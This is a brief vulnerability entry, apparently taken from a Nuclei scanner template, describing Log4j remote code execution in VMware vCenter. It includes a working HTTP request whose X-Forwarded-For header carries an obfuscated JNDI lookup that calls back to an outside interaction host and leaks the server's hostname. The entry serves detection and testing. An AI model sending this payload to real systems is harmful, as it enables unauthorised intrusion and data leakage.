# Vulnerability: VMware VCenter - Remote Code Execution (Apache Log4j)
**Classification:** CWE-78,CWE-502
**Source:** Nuclei Template (`vmware-vcenter-log4j-rce.yaml`)

## Description
VMware VCenter is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
Host: {{Hostname}}
X-Forwarded-For: ${jndi:${lower:d}n${lower:s}://${env:hostName}.{{interactsh-url}}}
```

